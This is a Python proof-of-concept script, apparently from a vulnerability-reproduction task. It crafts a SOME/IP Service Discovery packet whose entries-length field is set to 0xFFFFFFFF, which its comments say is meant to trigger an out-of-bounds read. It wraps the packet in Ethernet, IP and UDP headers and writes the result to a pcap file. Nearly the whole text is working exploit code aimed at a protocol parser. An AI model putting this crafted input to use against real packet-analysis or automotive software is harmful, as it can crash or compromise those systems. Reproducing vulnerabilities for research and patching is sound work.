# someiphdr: serviceID(2) methodID(2) length(4) clientID(2) sessionID(2) protocolVersion(1) interfaceVersion(1) msgType(1) returnCode(1)
# someipsdhdr adds: flags(1) reserved1(1) reserved2(1) reserved3(1)
# Then: length entries (4 bytes) at offset 20
someip_sd = bytearray(24)
# serviceID = 0xFFFF
someip_sd[0:2] = struct.pack('>H', 0xFFFF)
# methodID = 0x8100
someip_sd[2:4] = struct.pack('>H', 0x8100)
# length = 8 (must satisfy 8 <= length <= dataLen - 8 = 16)
someip_sd[4:8] = struct.pack('>I', 8)
# clientID = 0
someip_sd[8:10] = struct.pack('>H', 0)
# sessionID = 0
someip_sd[10:12] = struct.pack('>H', 0)
# protocolVersion = 1
someip_sd[12] = 1
# interfaceVersion = 1
someip_sd[13] = 1
# msgType = 0x00 (REQUEST)
someip_sd[14] = 0x00
# returnCode = 0
someip_sd[15] = 0
# flags = 0
someip_sd[16] = 0
# reserved = 0
someip_sd[17:20] = b'\x00\x00\x00'
# length entries = 0xFFFFFFFF (large value to trigger OOB read)
someip_sd[20:24] = struct.pack('>I', 0xFFFFFFFF)
print("SOME/IP-SD payload:", someip_sd.hex())
# Build UDP header
udp_src_port = 30490  # SOME/IP-SD port
udp_dst_port = 30490
udp_length = 8 + len(someip_sd)  # 8 + 24 = 32
udp_checksum = 0
udp_header = struct.pack('>HHHH', udp_src_port, udp_dst_port, udp_length, udp_checksum)
# Build IPv4 header
ip_version_ihl = 0x45  # IPv4, 5*4=20 bytes header
ip_tos = 0
ip_total_length = 20 + len(udp_header) + len(someip_sd)  # 20 + 8 + 24 = 52
ip_id = 0
ip_flags_frag = 0
ip_ttl = 64
ip_protocol = 17  # UDP
ip_checksum = 0
ip_src = struct.pack('>I', 0x0A000001)  # 10.0.0.1
ip_dst = struct.pack('>I', 0x0A000002)  # 10.0.0.2
ip_header = struct.pack('>BBHHHBBH4s4s', ip_version_ihl, ip_tos, ip_total_length, ip_id, ip_flags_frag, ip_ttl, ip_protocol, ip_checksum, ip_src, ip_dst)
# Build Ethernet header
eth_dst = b'\x00\x11\x22\x33\x44\x55'
eth_src = b'\x66\x77\x88\x99\xaa\xbb'
eth_type = struct.pack('>H', 0x0800)  # IPv4
eth_header = eth_dst + eth_src + eth_type
# Build the full packet
packet = eth_header + ip_header + udp_header + bytes(someip_sd)
# Build pcap file
pcap_magic = 0xa1b2c3d4
pcap_version_major = 2
pcap_version_minor = 4
pcap_thiszone = 0
pcap_sigfigs = 0
pcap_snaplen = 65535
pcap_linktype = 1  # Ethernet
pcap_header = struct.pack('<IHHiIII', pcap_magic, pcap_version_major, pcap_version_minor, pcap_thiszone, pcap_sigfigs, pcap_snaplen, pcap_linktype)
# Packet header
pkt_tv_sec = 0
pkt_tv_usec = 0
pkt_caplen = len(packet)
pkt_len = len(packet)
pkt_header = struct.pack('<IIII', pkt_tv_sec, pkt_tv_usec, pkt_caplen, pkt_len)
pcap_data = pcap_header + pkt_header + packet
with open('/workspace/poc.pcap', 'wb') as f:
    f.write(pcap_data)
print(f"Pcap file written: {len(pcap_data)} bytes")
print(f"Packet size: {len(packet)} bytes")
